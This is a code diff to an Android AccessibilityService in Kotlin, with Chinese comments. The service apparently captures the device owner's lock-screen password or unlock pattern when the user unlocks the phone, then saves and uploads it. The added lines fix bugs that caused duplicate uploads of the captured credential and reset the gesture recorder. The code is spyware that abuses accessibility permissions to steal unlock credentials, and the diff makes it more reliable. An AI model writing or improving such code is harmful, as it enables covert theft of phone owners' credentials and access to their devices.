@@ -1871,12 +1871,16 @@ class MyAccessibilityService : AccessibilityService() {
                                 try { sendScreenStatus() } catch (_: Exception) {}
                                 // 被动监听模式：用户解锁成功 = 密码验证成功
                                 // 但如果 GestureRecorderManager 正在录制图案，由它在 onUnlocked() 中处理
+                                // Bug 1 fix: also check hasReportedThisSession to prevent
+                                // double upload when GRM.onUnlocked already reported.
                                 val grm = gestureRecorderManager
-                                if (isCipherCaptureEnabled && (grm == null || !grm.isRecording)) {
+                                if (isCipherCaptureEnabled && (grm == null || (!grm.isRecording && !grm.hasReportedThisSession))) {
                                     android.util.Log.d(TAG, "🔐 USER_PRESENT + cipher监听中(非图案) → 确认保存密码")
                                     cipherCaptureManager?.confirmAndSaveLastCipher()
                                 } else if (grm?.isRecording == true) {
                                     android.util.Log.d(TAG, "🔐 USER_PRESENT + 图案录制中 → 由 GestureRecorderManager 处理")
+                                } else if (grm?.hasReportedThisSession == true) {
+                                    android.util.Log.d(TAG, "🔐 USER_PRESENT + GRM已上报本次会话 → 跳过重复上传")
                                 }
                                 val pType = pendingPasswordType
                                 if (pType != null) {
@@ -3536,6 +3540,8 @@ class MyAccessibilityService : AccessibilityService() {
                 isCipherCaptureEnabled = false
                 cipherRetryCount = 0
                 cipherCaptureManager?.stopListeningFull()
+                // Bug 5 fix: reset GRM so touch exploration doesn't stay on permanently
+                gestureRecorderManager?.reset()
                 if (cipherIsInstallationFlow) completeInstallationWithCipher()
             }
         }
